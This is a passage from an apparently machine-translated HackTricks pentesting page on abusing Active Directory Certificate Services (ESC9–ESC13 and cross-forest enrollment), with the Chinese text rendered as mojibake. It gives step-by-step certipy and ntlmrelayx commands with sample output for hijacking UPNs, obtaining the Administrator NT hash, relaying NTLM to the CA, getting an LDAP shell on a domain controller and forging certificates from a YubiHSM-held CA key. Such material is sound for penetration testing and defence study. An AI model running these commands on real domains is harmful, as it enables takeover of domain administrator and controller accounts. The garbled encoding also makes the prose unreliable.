<p>è¯¥æ ‡å¿—è®¾ç½®å˜å¾—é‡è¦çš„æ¡ä»¶åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>StrongCertificateBindingEnforcement</code> æœªè°ƒæ•´ä¸º <code>2</code>ï¼ˆé»˜è®¤ä¸º <code>1</code>ï¼‰ï¼Œæˆ– <code>CertificateMappingMethods</code> åŒ…å« <code>UPN</code> æ ‡å¿—ã€‚</li>
<li>è¯ä¹¦åœ¨ <code>msPKI-Enrollment-Flag</code> è®¾ç½®ä¸­æ ‡è®°ä¸º <code>CT_FLAG_NO_SECURITY_EXTENSION</code> æ ‡å¿—ã€‚</li>
<li>è¯ä¹¦æŒ‡å®šäº†ä»»ä½•å®¢æˆ·ç«¯èº«ä»½éªŒè¯ EKUã€‚</li>
<li>å¯¹ä»»ä½•å¸æˆ·å…·æœ‰ <code>GenericWrite</code> æƒé™ä»¥å¦¥åå¦ä¸€ä¸ªå¸æˆ·ã€‚</li>
</ul>
<h3 id="æ»¥ç”¨åœºæ™¯"><a class="header" href="#æ»¥ç”¨åœºæ™¯">æ»¥ç”¨åœºæ™¯</a></h3>
<p>å‡è®¾ <code>John@corp.local</code> å¯¹ <code>Jane@corp.local</code> æ‹¥æœ‰ <code>GenericWrite</code> æƒé™ï¼Œç›®æ ‡æ˜¯å¦¥å <code>Administrator@corp.local</code>ã€‚<code>Jane@corp.local</code> è¢«å…è®¸æ³¨å†Œçš„ <code>ESC9</code> è¯ä¹¦æ¨¡æ¿åœ¨å…¶ <code>msPKI-Enrollment-Flag</code> è®¾ç½®ä¸­é…ç½®äº† <code>CT_FLAG_NO_SECURITY_EXTENSION</code> æ ‡å¿—ã€‚</p>
<p>æœ€åˆï¼Œä½¿ç”¨ Shadow Credentials è·å– <code>Jane</code> çš„å“ˆå¸Œï¼Œå¾—ç›Šäº <code>John</code> çš„ <code>GenericWrite</code>ï¼š</p>
<pre><code class="language-bash">certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
</code></pre>
<p>éšåï¼Œ<code>Jane</code>çš„<code>userPrincipalName</code>è¢«ä¿®æ”¹ä¸º<code>Administrator</code>ï¼Œæ•…æ„çœç•¥äº†<code>@corp.local</code>åŸŸéƒ¨åˆ†ï¼š</p>
<pre><code class="language-bash">certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
</code></pre>
<p>æ­¤ä¿®æ”¹ä¸è¿åçº¦æŸï¼Œå› ä¸º <code>Administrator@corp.local</code> ä»ç„¶ä½œä¸º <code>Administrator</code> çš„ <code>userPrincipalName</code> è€Œä¿æŒç‹¬ç‰¹ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæ ‡è®°ä¸ºæ˜“å—æ”»å‡»çš„ <code>ESC9</code> è¯ä¹¦æ¨¡æ¿è¢«è¯·æ±‚ä¸º <code>Jane</code>ï¼š</p>
<pre><code class="language-bash">certipy req -username jane@corp.local -hashes &lt;hash&gt; -ca corp-DC-CA -template ESC9
</code></pre>
<p>æ³¨æ„åˆ°è¯ä¹¦çš„ <code>userPrincipalName</code> åæ˜ äº† <code>Administrator</code>ï¼Œæ²¡æœ‰ä»»ä½•â€œå¯¹è±¡ SIDâ€ã€‚</p>
<p><code>Jane</code> çš„ <code>userPrincipalName</code> éšåæ¢å¤ä¸ºå¥¹çš„åŸå§‹å€¼ <code>Jane@corp.local</code>ï¼š</p>
<pre><code class="language-bash">certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
</code></pre>
<p>å°è¯•ä½¿ç”¨å·²å‘æ”¾çš„è¯ä¹¦è¿›è¡Œèº«ä»½éªŒè¯ç°åœ¨ä¼šäº§ç”Ÿ <code>Administrator@corp.local</code> çš„ NT å“ˆå¸Œã€‚ç”±äºè¯ä¹¦ç¼ºä¹åŸŸè§„èŒƒï¼Œå‘½ä»¤å¿…é¡»åŒ…å« <code>-domain &lt;domain&gt;</code>ï¼š</p>
<pre><code class="language-bash">certipy auth -pfx adminitrator.pfx -domain corp.local
</code></pre>
<h2 id="å¼±è¯ä¹¦æ˜ å°„---esc10"><a class="header" href="#å¼±è¯ä¹¦æ˜ å°„---esc10">å¼±è¯ä¹¦æ˜ å°„ - ESC10</a></h2>
<h3 id="è§£é‡Š-4"><a class="header" href="#è§£é‡Š-4">è§£é‡Š</a></h3>
<p>åŸŸæ§åˆ¶å™¨ä¸Šçš„ä¸¤ä¸ªæ³¨å†Œè¡¨é¡¹å€¼è¢«ESC10å¼•ç”¨ï¼š</p>
<ul>
<li><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel</code>ä¸‹çš„<code>CertificateMappingMethods</code>çš„é»˜è®¤å€¼ä¸º<code>0x18</code>ï¼ˆ<code>0x8 | 0x10</code>ï¼‰ï¼Œä¹‹å‰è®¾ç½®ä¸º<code>0x1F</code>ã€‚</li>
<li><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc</code>ä¸‹çš„<code>StrongCertificateBindingEnforcement</code>çš„é»˜è®¤è®¾ç½®ä¸º<code>1</code>ï¼Œä¹‹å‰ä¸º<code>0</code>ã€‚</li>
</ul>
<p><strong>æ¡ˆä¾‹ 1</strong></p>
<p>å½“<code>StrongCertificateBindingEnforcement</code>é…ç½®ä¸º<code>0</code>æ—¶ã€‚</p>
<p><strong>æ¡ˆä¾‹ 2</strong></p>
<p>å¦‚æœ<code>CertificateMappingMethods</code>åŒ…å«<code>UPN</code>ä½ï¼ˆ<code>0x4</code>ï¼‰ã€‚</p>
<h3 id="æ»¥ç”¨æ¡ˆä¾‹-1"><a class="header" href="#æ»¥ç”¨æ¡ˆä¾‹-1">æ»¥ç”¨æ¡ˆä¾‹ 1</a></h3>
<p>å½“<code>StrongCertificateBindingEnforcement</code>é…ç½®ä¸º<code>0</code>æ—¶ï¼Œå…·æœ‰<code>GenericWrite</code>æƒé™çš„è´¦æˆ·Aå¯ä»¥è¢«åˆ©ç”¨æ¥å¦¥åä»»ä½•è´¦æˆ·Bã€‚</p>
<p>ä¾‹å¦‚ï¼Œæ‹¥æœ‰å¯¹<code>Jane@corp.local</code>çš„<code>GenericWrite</code>æƒé™ï¼Œæ”»å‡»è€…æ—¨åœ¨å¦¥å<code>Administrator@corp.local</code>ã€‚è¯¥è¿‡ç¨‹ä¸ESC9ç›¸ä¼¼ï¼Œå…è®¸ä½¿ç”¨ä»»ä½•è¯ä¹¦æ¨¡æ¿ã€‚</p>
<p>æœ€åˆï¼Œä½¿ç”¨Shadow Credentialsæ£€ç´¢<code>Jane</code>çš„å“ˆå¸Œï¼Œåˆ©ç”¨<code>GenericWrite</code>ã€‚</p>
<pre><code class="language-bash">certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
</code></pre>
<p>éšåï¼Œ<code>Jane</code>çš„<code>userPrincipalName</code>è¢«æ›´æ”¹ä¸º<code>Administrator</code>ï¼Œæ•…æ„çœç•¥<code>@corp.local</code>éƒ¨åˆ†ä»¥é¿å…çº¦æŸå†²çªã€‚</p>
<pre><code class="language-bash">certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
</code></pre>
<p>æ¥ä¸‹æ¥ï¼Œä½œä¸º <code>Jane</code> è¯·æ±‚ä¸€ä¸ªå¯ç”¨å®¢æˆ·ç«¯èº«ä»½éªŒè¯çš„è¯ä¹¦ï¼Œä½¿ç”¨é»˜è®¤çš„ <code>User</code> æ¨¡æ¿ã€‚</p>
<pre><code class="language-bash">certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes &lt;hash&gt;
</code></pre>
<p><code>Jane</code>çš„<code>userPrincipalName</code>éšåè¢«æ¢å¤ä¸ºå…¶åŸå§‹å€¼<code>Jane@corp.local</code>ã€‚</p>
<pre><code class="language-bash">certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
</code></pre>
<p>ä½¿ç”¨è·å¾—çš„è¯ä¹¦è¿›è¡Œèº«ä»½éªŒè¯å°†äº§ç”Ÿ <code>Administrator@corp.local</code> çš„ NT å“ˆå¸Œï¼Œå› æ­¤ç”±äºè¯ä¹¦ä¸­ç¼ºå°‘åŸŸè¯¦ç»†ä¿¡æ¯ï¼Œå‘½ä»¤ä¸­éœ€è¦æŒ‡å®šåŸŸã€‚</p>
<pre><code class="language-bash">certipy auth -pfx administrator.pfx -domain corp.local
</code></pre>
<h3 id="abuse-case-2"><a class="header" href="#abuse-case-2">Abuse Case 2</a></h3>
<p>åœ¨ <code>CertificateMappingMethods</code> åŒ…å« <code>UPN</code> ä½æ ‡å¿— (<code>0x4</code>) çš„æƒ…å†µä¸‹ï¼Œå…·æœ‰ <code>GenericWrite</code> æƒé™çš„è´¦æˆ· A å¯ä»¥ç ´åä»»ä½•ç¼ºå°‘ <code>userPrincipalName</code> å±æ€§çš„è´¦æˆ· Bï¼ŒåŒ…æ‹¬æœºå™¨è´¦æˆ·å’Œå†…ç½®åŸŸç®¡ç†å‘˜ <code>Administrator</code>ã€‚</p>
<p>åœ¨è¿™é‡Œï¼Œç›®æ ‡æ˜¯ç ´å <code>DC$@corp.local</code>ï¼Œé¦–å…ˆé€šè¿‡ Shadow Credentials è·å– <code>Jane</code> çš„å“ˆå¸Œï¼Œåˆ©ç”¨ <code>GenericWrite</code>ã€‚</p>
<pre><code class="language-bash">certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
</code></pre>
<p><code>Jane</code>çš„<code>userPrincipalName</code>è¢«è®¾ç½®ä¸º<code>DC$@corp.local</code>ã€‚</p>
<pre><code class="language-bash">certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
</code></pre>
<p>è¯·æ±‚ä¸€ä¸ªç”¨äºå®¢æˆ·ç«¯èº«ä»½éªŒè¯çš„è¯ä¹¦ï¼Œä½œä¸º <code>Jane</code> ä½¿ç”¨é»˜è®¤çš„ <code>User</code> æ¨¡æ¿ã€‚</p>
<pre><code class="language-bash">certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes &lt;hash&gt;
</code></pre>
<p><code>Jane</code>çš„<code>userPrincipalName</code>åœ¨æ­¤è¿‡ç¨‹åæ¢å¤ä¸ºå…¶åŸå§‹å€¼ã€‚</p>
<pre><code class="language-bash">certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
</code></pre>
<p>é€šè¿‡ Schannel è¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼Œä½¿ç”¨ Certipy çš„ <code>-ldap-shell</code> é€‰é¡¹ï¼Œèº«ä»½éªŒè¯æˆåŠŸçš„æŒ‡ç¤ºä¸º <code>u:CORP\DC$</code>ã€‚</p>
<pre><code class="language-bash">certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
</code></pre>
<p>é€šè¿‡LDAP shellï¼Œå‘½ä»¤å¦‚<code>set_rbcd</code>å¯ç”¨åŸºäºèµ„æºçš„å—é™å§”æ´¾ï¼ˆRBCDï¼‰æ”»å‡»ï¼Œå¯èƒ½ä¼šå±åŠåŸŸæ§åˆ¶å™¨ã€‚</p>
<pre><code class="language-bash">certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
</code></pre>
<p>æ­¤æ¼æ´è¿˜æ‰©å±•åˆ°ä»»ä½•ç¼ºå°‘ <code>userPrincipalName</code> çš„ç”¨æˆ·å¸æˆ·ï¼Œæˆ–å…¶ä¸ <code>sAMAccountName</code> ä¸åŒ¹é…çš„å¸æˆ·ï¼Œé»˜è®¤çš„ <code>Administrator@corp.local</code> æ˜¯ä¸€ä¸ªä¸»è¦ç›®æ ‡ï¼Œå› ä¸ºå®ƒå…·æœ‰æå‡çš„ LDAP æƒé™ï¼Œå¹¶ä¸”é»˜è®¤æƒ…å†µä¸‹ç¼ºå°‘ <code>userPrincipalName</code>ã€‚</p>
<h2 id="relaying-ntlm-to-icpr---esc11"><a class="header" href="#relaying-ntlm-to-icpr---esc11">Relaying NTLM to ICPR - ESC11</a></h2>
<h3 id="explanation-6"><a class="header" href="#explanation-6">Explanation</a></h3>
<p>å¦‚æœ CA æœåŠ¡å™¨æœªé…ç½® <code>IF_ENFORCEENCRYPTICERTREQUEST</code>ï¼Œåˆ™å¯ä»¥é€šè¿‡ RPC æœåŠ¡è¿›è¡Œæœªç­¾åçš„ NTLM ä¸­ç»§æ”»å‡»ã€‚<a href="https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/">å‚è€ƒé“¾æ¥</a>ã€‚</p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <code>certipy</code> æ¥æšä¸¾ <code>Enforce Encryption for Requests</code> æ˜¯å¦è¢«ç¦ç”¨ï¼Œcertipy å°†æ˜¾ç¤º <code>ESC11</code> æ¼æ´ã€‚</p>
<pre><code class="language-bash">$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

</code></pre>
<h3 id="æ»¥ç”¨åœºæ™¯-1"><a class="header" href="#æ»¥ç”¨åœºæ™¯-1">æ»¥ç”¨åœºæ™¯</a></h3>
<p>éœ€è¦è®¾ç½®ä¸€ä¸ªä¸­ç»§æœåŠ¡å™¨ï¼š</p>
<pre><code class="language-bash">$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
</code></pre>
<p>æ³¨æ„ï¼šå¯¹äºåŸŸæ§åˆ¶å™¨ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ DomainController ä¸­æŒ‡å®š <code>-template</code>ã€‚</p>
<p>æˆ–è€…ä½¿ç”¨ <a href="https://github.com/sploutchy/impacket">sploutchy's fork of impacket</a>ï¼š</p>
<pre><code class="language-bash">$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
</code></pre>
<h2 id="shell-access-to-adcs-ca-with-yubihsm---esc12"><a class="header" href="#shell-access-to-adcs-ca-with-yubihsm---esc12">Shell access to ADCS CA with YubiHSM - ESC12</a></h2>
<h3 id="explanation-7"><a class="header" href="#explanation-7">Explanation</a></h3>
<p>ç®¡ç†å‘˜å¯ä»¥è®¾ç½®è¯ä¹¦é¢å‘æœºæ„ï¼Œå°†å…¶å­˜å‚¨åœ¨å¤–éƒ¨è®¾å¤‡ä¸Šï¼Œä¾‹å¦‚â€œYubico YubiHSM2â€ã€‚</p>
<p>å¦‚æœUSBè®¾å¤‡é€šè¿‡USBç«¯å£è¿æ¥åˆ°CAæœåŠ¡å™¨ï¼Œæˆ–è€…åœ¨CAæœåŠ¡å™¨æ˜¯è™šæ‹Ÿæœºçš„æƒ…å†µä¸‹è¿æ¥åˆ°USBè®¾å¤‡æœåŠ¡å™¨ï¼Œåˆ™éœ€è¦ä¸€ä¸ªèº«ä»½éªŒè¯å¯†é’¥ï¼ˆæœ‰æ—¶ç§°ä¸ºâ€œå¯†ç â€ï¼‰ï¼Œä»¥ä¾¿å¯†é’¥å­˜å‚¨æä¾›ç¨‹åºç”Ÿæˆå’Œä½¿ç”¨YubiHSMä¸­çš„å¯†é’¥ã€‚</p>
<p>æ­¤å¯†é’¥/å¯†ç ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­ï¼Œè·¯å¾„ä¸º<code>HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword</code>ã€‚</p>
<p>å‚è€ƒ<a href="https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm">è¿™é‡Œ</a>ã€‚</p>
<h3 id="abuse-scenario"><a class="header" href="#abuse-scenario">Abuse Scenario</a></h3>
<p>å¦‚æœCAçš„ç§é’¥å­˜å‚¨åœ¨ç‰©ç†USBè®¾å¤‡ä¸Šï¼Œå½“æ‚¨è·å¾—shellè®¿é—®æƒé™æ—¶ï¼Œå¯ä»¥æ¢å¤è¯¥å¯†é’¥ã€‚</p>
<p>é¦–å…ˆï¼Œæ‚¨éœ€è¦è·å–CAè¯ä¹¦ï¼ˆè¿™æ˜¯å…¬å¼€çš„ï¼‰ï¼Œç„¶åï¼š</p>
<pre><code class="language-cmd"># import it to the user store with CA certificate
$ certutil -addstore -user my &lt;CA certificate file&gt;

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my &lt;CA Common Name&gt;
</code></pre>
<p>æœ€åï¼Œä½¿ç”¨ certutil <code>-sign</code> å‘½ä»¤åˆ©ç”¨ CA è¯ä¹¦åŠå…¶ç§é’¥ä¼ªé€ ä¸€ä¸ªæ–°çš„ä»»æ„è¯ä¹¦ã€‚</p>
<h2 id="oid-ç»„é“¾æ¥æ»¥ç”¨---esc13"><a class="header" href="#oid-ç»„é“¾æ¥æ»¥ç”¨---esc13">OID ç»„é“¾æ¥æ»¥ç”¨ - ESC13</a></h2>
<h3 id="è§£é‡Š-5"><a class="header" href="#è§£é‡Š-5">è§£é‡Š</a></h3>
<p><code>msPKI-Certificate-Policy</code> å±æ€§å…è®¸å°†å‘è¡Œæ”¿ç­–æ·»åŠ åˆ°è¯ä¹¦æ¨¡æ¿ä¸­ã€‚è´Ÿè´£å‘è¡Œæ”¿ç­–çš„ <code>msPKI-Enterprise-Oid</code> å¯¹è±¡å¯ä»¥åœ¨ PKI OID å®¹å™¨çš„é…ç½®å‘½åä¸Šä¸‹æ–‡ (CN=OID,CN=Public Key Services,CN=Services) ä¸­å‘ç°ã€‚å¯ä»¥ä½¿ç”¨è¯¥å¯¹è±¡çš„ <code>msDS-OIDToGroupLink</code> å±æ€§å°†æ”¿ç­–é“¾æ¥åˆ° AD ç»„ï¼Œä»è€Œä½¿ç³»ç»Ÿèƒ½å¤Ÿæˆæƒä¸€ä¸ªç”¨æˆ·åœ¨å‘ˆç°è¯ä¹¦æ—¶ä»¿ä½›ä»–æ˜¯è¯¥ç»„çš„æˆå‘˜ã€‚<a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53">å‚è€ƒé“¾æ¥</a>ã€‚</p>
<p>æ¢å¥è¯è¯´ï¼Œå½“ç”¨æˆ·æœ‰æƒæ³¨å†Œè¯ä¹¦ä¸”è¯¥è¯ä¹¦é“¾æ¥åˆ° OID ç»„æ—¶ï¼Œç”¨æˆ·å¯ä»¥ç»§æ‰¿è¯¥ç»„çš„æƒé™ã€‚</p>
<p>ä½¿ç”¨ <a href="https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1">Check-ADCSESC13.ps1</a> æŸ¥æ‰¾ OIDToGroupLinkï¼š</p>
<pre><code class="language-powershell">Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
</code></pre>
<h3 id="æ»¥ç”¨åœºæ™¯-2"><a class="header" href="#æ»¥ç”¨åœºæ™¯-2">æ»¥ç”¨åœºæ™¯</a></h3>
<p>æ‰¾åˆ°ä¸€ä¸ªç”¨æˆ·æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ <code>certipy find</code> æˆ– <code>Certify.exe find /showAllPermissions</code>ã€‚</p>
<p>å¦‚æœ <code>John</code> æœ‰æƒé™æ³¨å†Œ <code>VulnerableTemplate</code>ï¼Œåˆ™è¯¥ç”¨æˆ·å¯ä»¥ç»§æ‰¿ <code>VulnerableGroup</code> ç»„çš„æƒé™ã€‚</p>
<p>æ‰€éœ€çš„åªæ˜¯æŒ‡å®šæ¨¡æ¿ï¼Œå®ƒå°†è·å¾—å…·æœ‰ OIDToGroupLink æƒé™çš„è¯ä¹¦ã€‚</p>
<pre><code class="language-bash">certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
</code></pre>
<h2 id="ç”¨è¢«åŠ¨è¯­æ€è§£é‡Šçš„è¯ä¹¦å¦¥åæ£®æ—"><a class="header" href="#ç”¨è¢«åŠ¨è¯­æ€è§£é‡Šçš„è¯ä¹¦å¦¥åæ£®æ—">ç”¨è¢«åŠ¨è¯­æ€è§£é‡Šçš„è¯ä¹¦å¦¥åæ£®æ—</a></h2>
<h3 id="è¢«å¦¥åçš„caç ´åæ£®æ—ä¿¡ä»»"><a class="header" href="#è¢«å¦¥åçš„caç ´åæ£®æ—ä¿¡ä»»">è¢«å¦¥åçš„CAç ´åæ£®æ—ä¿¡ä»»</a></h3>
<p><strong>è·¨æ£®æ—æ³¨å†Œ</strong>çš„é…ç½®ç›¸å¯¹ç®€å•ã€‚èµ„æºæ£®æ—çš„<strong>æ ¹CAè¯ä¹¦</strong>ç”±ç®¡ç†å‘˜<strong>å‘å¸ƒåˆ°è´¦æˆ·æ£®æ—</strong>ï¼Œèµ„æºæ£®æ—çš„<strong>ä¼ä¸šCA</strong>è¯ä¹¦è¢«<strong>æ·»åŠ åˆ°æ¯ä¸ªè´¦æˆ·æ£®æ—ä¸­çš„<code>NTAuthCertificates</code>å’ŒAIAå®¹å™¨</strong>ã€‚ä¸ºäº†æ¾„æ¸…ï¼Œè¿™ç§å®‰æ’æˆäºˆèµ„æºæ£®æ—ä¸­çš„<strong>CAå¯¹å…¶ç®¡ç†çš„æ‰€æœ‰å…¶ä»–æ£®æ—çš„å®Œå…¨æ§åˆ¶æƒ</strong>ã€‚å¦‚æœè¯¥CAè¢«<strong>æ”»å‡»è€…å¦¥å</strong>ï¼Œåˆ™èµ„æºæ£®æ—å’Œè´¦æˆ·æ£®æ—ä¸­æ‰€æœ‰ç”¨æˆ·çš„è¯ä¹¦éƒ½å¯èƒ½è¢«<strong>ä¼ªé€ </strong>ï¼Œä»è€Œæ‰“ç ´æ£®æ—çš„å®‰å…¨è¾¹ç•Œã€‚</p>
<h3 id="æˆäºˆå¤–éƒ¨ä¸»ä½“çš„æ³¨å†Œæƒé™"><a class="header" href="#æˆäºˆå¤–éƒ¨ä¸»ä½“çš„æ³¨å†Œæƒé™">æˆäºˆå¤–éƒ¨ä¸»ä½“çš„æ³¨å†Œæƒé™</a></h3>
<p>åœ¨å¤šæ£®æ—ç¯å¢ƒä¸­ï¼Œå…³äº<strong>å‘å¸ƒè¯ä¹¦æ¨¡æ¿</strong>çš„ä¼ä¸šCAéœ€è¦è°¨æ…ï¼Œè¿™äº›æ¨¡æ¿å…è®¸<strong>ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·æˆ–å¤–éƒ¨ä¸»ä½“</strong>ï¼ˆå±äºä¼ä¸šCAæ‰€åœ¨æ£®æ—çš„å¤–éƒ¨ç”¨æˆ·/ç»„ï¼‰<strong>æ³¨å†Œå’Œç¼–è¾‘æƒé™</strong>ã€‚<br />
åœ¨ä¿¡ä»»å…³ç³»ä¸­è¿›è¡Œèº«ä»½éªŒè¯åï¼Œ<strong>ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·SID</strong>ä¼šè¢«ADæ·»åŠ åˆ°ç”¨æˆ·çš„ä»¤ç‰Œä¸­ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ªåŸŸæ‹¥æœ‰ä¸€ä¸ªå…è®¸<strong>ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·æ³¨å†Œæƒé™</strong>çš„ä¼ä¸šCAï¼Œåˆ™æ¥è‡ªä¸åŒæ£®æ—çš„ç”¨æˆ·å¯èƒ½ä¼š<strong>æ³¨å†Œè¯¥æ¨¡æ¿</strong>ã€‚åŒæ ·ï¼Œå¦‚æœ<strong>æ¨¡æ¿æ˜ç¡®æˆäºˆå¤–éƒ¨ä¸»ä½“æ³¨å†Œæƒé™</strong>ï¼Œåˆ™<strong>ç”±æ­¤åˆ›å»ºäº†è·¨æ£®æ—çš„è®¿é—®æ§åˆ¶å…³ç³»</strong>ï¼Œä½¿å¾—ä¸€ä¸ªæ£®æ—ä¸­çš„ä¸»ä½“èƒ½å¤Ÿ<strong>æ³¨å†Œå¦ä¸€ä¸ªæ£®æ—ä¸­çš„æ¨¡æ¿</strong>ã€‚</p>
<p>è¿™ä¸¤ç§æƒ…å†µéƒ½ä¼šå¯¼è‡´<strong>æ”»å‡»é¢ä»ä¸€ä¸ªæ£®æ—å¢åŠ åˆ°å¦ä¸€ä¸ªæ£®æ—</strong>ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯ä¹¦æ¨¡æ¿çš„è®¾ç½®åœ¨å¤–éƒ¨åŸŸä¸­è·å¾—é¢å¤–æƒé™ã€‚</p>
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶(ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶(GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒHackTricks</summary>
<ul>
<li>æŸ¥çœ‹<a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discordç¾¤ç»„</strong></a>æˆ–<a href="https://t.me/peass"><strong>Telegramç¾¤ç»„</strong></a>æˆ–<strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>å’Œ<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../windows-hardening/active-directory-methodology/ad-certificates/domain-persistence.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../windows-hardening/active-directory-methodology/ad-certificates/domain-persistence.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
